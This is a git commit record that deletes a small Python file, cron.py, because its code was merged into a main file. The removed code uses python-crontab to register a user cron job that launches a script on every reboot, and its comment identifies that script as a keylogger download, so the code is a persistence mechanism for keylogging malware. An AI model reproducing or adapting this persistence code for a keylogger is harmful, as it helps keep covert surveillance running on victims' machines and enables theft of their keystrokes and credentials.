73126f7dde7c4c9152083eb6263a655bcb8baa8d
Brendan Cardinal <112900230+bc9235@users.noreply.github.com>
2022-11-10 14:11:14 -0800

    Delete cron.py
    Not necessary after merging this code into main file

--- cron.py
+++
@@ -1,8 +0,0 @@
-from crontab import CronTab
-
-
-def cron():
-    my_cron = CronTab(user=True)
-    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
-    job.every_reboot()
-    my_cron.write()
